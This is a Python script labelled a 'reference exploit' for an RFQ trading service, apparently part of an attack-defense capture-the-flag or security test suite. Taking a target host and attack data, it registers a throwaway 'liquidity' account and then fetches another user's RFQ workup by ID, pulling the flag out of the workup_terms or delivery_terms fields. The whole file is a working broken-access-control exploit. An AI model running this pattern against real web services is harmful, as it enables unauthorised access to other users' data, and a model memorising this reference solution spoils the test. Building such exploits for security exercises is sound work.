#!/usr/bin/env python3
"""Reference exploit for EX-2 RFQ workup sampleage."""

from __future__ import annotations

import json
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Mapping


TIMEOUT = 5


class ExploitError(Exception):
    pass


def main(argv: list[str]) -> int:
    if len(argv) != 3:
        print("usage: ex_rfq_workup.py <host> <attack-data-json>", file=sys.stderr)
        return 2

    try:
        host = normalize_base_url(argv[1])
        attack_data = parse_attack_data(argv[2])
        token = register_liquidity_account(host)
        rfq_id = required_value(attack_data, "rfq_id")
        request_json(host, "GET", "/api/rfq/board", token=token)
        workup = workup_rfq(host, token, rfq_id)
        flag = extract_workup_marker(workup)
    except ExploitError as error:
        print(str(error), file=sys.stderr)
        return 1

    print(flag)
    return 0


def parse_attack_data(raw: str) -> Mapping[str, Any]:
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as error:
        raise ExploitError("invalid attack data") from error
    if not isinstance(data, Mapping):
        raise ExploitError("attack data must be an object")
    if isinstance(data.get("public"), Mapping):
        data = data["public"]
    if data.get("place") not in (3, "3"):
        raise ExploitError("attack data is not for place 3")
    return data


def register_liquidity_account(host: str) -> str:
    nonce = secrets.token_hex(8)
    response = request_json(
        host,
        "POST",
        "/api/auth/register",
        payload={
            "username": f"ex2-maker-{nonce}",
            "password": f"Vx-{secrets.token_urlsafe(18)}",
            "account_profile": "liquidity",
        },
    )
    token = response.get("session", {}).get("token") if isinstance(response.get("session"), Mapping) else None
    if not isinstance(token, str) or not token:
        raise ExploitError("liquidity account registration failed")
    return token


def workup_rfq(host: str, token: str, rfq_id: Any) -> Mapping[str, Any]:
    encoded = urllib.parse.quote(str(rfq_id), safe="")
    response = request_json(host, "GET", f"/api/rfq/{encoded}/workup", token=token)
    rfq = response.get("rfq")
    if not isinstance(rfq, Mapping):
        raise ExploitError("RFQ workup response missing")
    return rfq


def request_json(
    host: str,
    method: str,
    path: str,
    *,
    payload: Mapping[str, Any] | None = None,
    token: str | None = None,
) -> Mapping[str, Any]:
    body = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        body = json.dumps(payload, sort_keys=True, separators=(",", ":")).encode("utf-8")
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = f"Bearer {token}"

    last_error: Exception | None = None
    for _attempt in range(3):
        request = urllib.request.Request(host + path, data=body, headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=TIMEOUT) as response:
                raw = response.read()
                break
        except urllib.error.HTTPError as error:
            if error.code < 500:
                raise ExploitError(f"unexpected HTTP status {error.code}") from error
            last_error = error
        except OSError as error:
            last_error = error
    else:
        raise ExploitError("service unavailable") from last_error

    try:
        data = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as error:
        raise ExploitError("invalid JSON response") from error
    if not isinstance(data, Mapping):
        raise ExploitError("JSON response must be an object")
    return data


def required_value(data: Mapping[str, Any], key: str) -> Any:
    value = data.get(key)
    if value in (None, ""):
        raise ExploitError(f"{key} missing")
    return value


def required_string(data: Mapping[str, Any], key: str) -> str:
    value = data.get(key)
    if not isinstance(value, str) or not value:
        raise ExploitError(f"{key} missing")
    return value


def extract_workup_marker(workup: Mapping[str, Any]) -> str:
    for key in ("workup_terms", "delivery_terms"):
        value = workup.get(key)
        if isinstance(value, str) and value:
            return value
    raise ExploitError("workup marker missing")


def normalize_base_url(host: str) -> str:
    if not host:
        raise ExploitError("host is required")
    host = host.strip()
    if not host.startswith(("http://", "https://")):
        host = "http://" + host
    return host.rstrip("/")


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
